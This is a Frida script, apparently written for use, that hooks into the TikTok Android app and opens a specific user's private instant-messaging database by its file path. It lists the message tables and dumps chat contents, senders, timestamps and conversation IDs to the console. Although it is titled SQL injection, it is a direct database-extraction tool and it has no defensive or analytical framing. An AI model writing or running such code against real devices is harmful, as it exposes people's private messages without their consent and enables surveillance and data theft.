/*
 * DUDE's SQL Injection (Internal)
 * Connects to the app's private SQLite database and dumps the chat history.
 */

Java.perform(function () {
    console.log("[*] DUDE: Connecting to IM Database...");

    try {
        var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
        // Target the specific user DB we found
        var dbPath = "/data/data/com.ss.android.ugc.trill/databases/7574297133429703688_im.db";
        
        var db = SQLiteDatabase.openDatabase(dbPath, null, 0); // OPEN_READWRITE
        console.log("[+] Database Opened Successfully!");

        // 1. List Tables (to find where messages are hidden)
        var cursor = db.rawQuery("SELECT name FROM sqlite_master WHERE type='table'", null);
        console.log("[*] Tables found:");
        while (cursor.moveToNext()) {
            var tableName = cursor.getString(0);
            // Filter for interesting tables to reduce noise
            if (tableName.includes("msg") || tableName.includes("chat") || tableName.includes("conversation")) {
                console.log("   -> " + tableName);
            }
        }
        cursor.close();

        // 2. Dump Messages (Blind guess on table name 'msg' or 'message' - standard usually)
        // If we found specific tables above, we'd query them. 
        // Let's try a generic dump of the most likely candidate: 'msg'
        try {
            var msgCursor = db.rawQuery("SELECT * FROM msg LIMIT 10", null); 
            console.log("\n[***] DUMPING CHAT LOGS [***]");
            
            var colNames = msgCursor.getColumnNames();
            console.log("Columns: " + colNames.toString());

            while (msgCursor.moveToNext()) {
                // Try to extract content. Column indexes vary, so we print a few key ones.
                // Usually: content, sender, created_time
                var rowData = "";
                for (var i = 0; i < colNames.length; i++) {
                     var colName = colNames[i];
                     if (colName == "content" || colName == "sender" || colName == "create_time" || colName == "conversation_id") {
                         var val = "";
                         try { val = msgCursor.getString(i); } catch(e) { val = "[BLOB]"; }
                         rowData += colName + ": " + val + " | ";
                     }
                }
                console.log("MSG: " + rowData);
            }
            msgCursor.close();
        } catch(e) {
            console.log("[-] Could not dump 'msg' table (might be named 'simple_msg' or similar): " + e.message);
        }

        db.close();

    } catch(e) {
        console.log("[-] SQL Error: " + e.message);
    }
});
